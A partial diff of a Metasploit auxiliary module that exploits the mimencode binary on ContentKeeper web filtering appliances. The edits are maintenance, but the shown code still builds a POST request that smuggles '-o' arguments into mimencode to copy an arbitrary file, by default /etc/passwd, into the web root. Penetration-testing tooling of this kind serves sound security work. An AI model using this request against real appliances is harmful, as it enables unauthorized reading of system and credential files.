@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -14,13 +10,11 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::WMAPScanServer
 	include Msf::Auxiliary::Scanner
 
 	def initialize
 		super(
 			'Name'        => 'ContentKeeper Web Appliance mimencode File Access',
-			'Version'     => '$Revision$',
 			'Description' => %q{
 				This module abuses the 'mimencode' binary present within
 				ContentKeeper Web filtering appliances to retrieve arbitrary
@@ -36,7 +30,6 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				Opt::RPORT(80),
 				OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd']),
 				OptString.new('URL', [ true, 'The path to mimencode', '/cgi-bin/ck/mimencode']),
 			], self.class)
@@ -50,7 +43,7 @@ class Metasploit3 < Msf::Auxiliary
 			res = send_request_raw(
 				{
 					'method'  => 'POST',
-					'uri'     => datastore['URL'] + '?-o+' + '/home/httpd/html/' + tmpfile + '+' + datastore['FILE'],
+					'uri'     => normalize_uri(datastore['URL']) + '?-o+' + '/home/httpd/html/' + tmpfile + '+' + datastore['FILE'],
 				}, 25)
 
 			if (res and res.code == 500)
